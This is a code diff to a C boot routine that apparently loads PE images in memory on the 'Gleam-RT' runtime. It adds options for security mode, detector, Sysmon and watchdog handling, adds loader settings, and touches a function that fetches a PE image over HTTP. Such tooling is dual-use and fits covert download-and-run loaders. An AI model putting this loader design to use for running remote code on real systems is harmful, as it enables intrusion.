@@ -20,6 +20,10 @@ errno Boot()
     // initialize Gleam-RT for PE Loader
     Runtime_Opts options = {
         .BootInstAddress     = GetFuncAddr(&Boot),
+        .EnableSecurityMode  = false,
+        .DisableDetector     = false,
+        .DisableSysmon       = false,
+        .DisableWatchdog     = false,
         .NotEraseInstruction = false,
         .NotAdjustProtect    = false,
         .TrackCurrentThread  = false,
@@ -61,14 +65,17 @@ errno Boot()
         PELoader_Cfg config = {
             .FindAPI = runtime->HashAPI.FindAPI,
 
-            .Image        = image,
-            .CommandLineA = NULL,
-            .CommandLineW = NULL,
-            .WaitMain     = false,
-            .AllowSkipDLL = false,
-            .StdInput     = NULL,
-            .StdOutput    = NULL,
-            .StdError     = NULL,
+            .Image          = image,
+            .CommandLineA   = NULL,
+            .CommandLineW   = NULL,
+            .WaitMain       = false,
+            .AllowSkipDLL   = false,
+            .IgnoreStdIO    = true,
+            .StdInput       = NULL,
+            .StdOutput      = NULL,
+            .StdError       = NULL,
+            .NotAutoRun     = false,
+            .NotStopRuntime = false,
 
             .NotEraseInstruction = options.NotEraseInstruction,
             .NotAdjustProtect    = options.NotAdjustProtect,
@@ -124,9 +131,13 @@ static errno loadOption(Runtime_Opts* options)
         return ERR_INVALID_OPTION_STUB;
     }
     // load runtime options from stub
-    options->NotEraseInstruction = *(bool*)(stub+OPT_OFFSET_NOT_ERASE_INSTRUCTION);
-    options->NotAdjustProtect    = *(bool*)(stub+OPT_OFFSET_NOT_ADJUST_PROTECT);
-    options->TrackCurrentThread  = *(bool*)(stub+OPT_OFFSET_NOT_TRACK_CURRENT_THREAD);
+    options->EnableSecurityMode  = *(bool*)(stub + OPT_OFFSET_ENABLE_SECURITY_MODE);
+    options->DisableDetector     = *(bool*)(stub + OPT_OFFSET_DISABLE_DETECTOR);
+    options->DisableSysmon       = *(bool*)(stub + OPT_OFFSET_DISABLE_SYSMON);
+    options->DisableWatchdog     = *(bool*)(stub + OPT_OFFSET_DISABLE_WATCHDOG);
+    options->NotEraseInstruction = *(bool*)(stub + OPT_OFFSET_NOT_ERASE_INSTRUCTION);
+    options->NotAdjustProtect    = *(bool*)(stub + OPT_OFFSET_NOT_ADJUST_PROTECT);
+    options->TrackCurrentThread  = *(bool*)(stub + OPT_OFFSET_TRACK_CURRENT_THREAD);
     return NO_ERROR;
 }
 
@@ -228,6 +239,6 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
         SetLastErrno(ERR_INVALID_PE_IMAGE);
         return NULL;
     }
-    runtime->WinHTTP.Free();
+    runtime->WinHTTP.FreeDLL();
     return resp.Body.buf;
 }
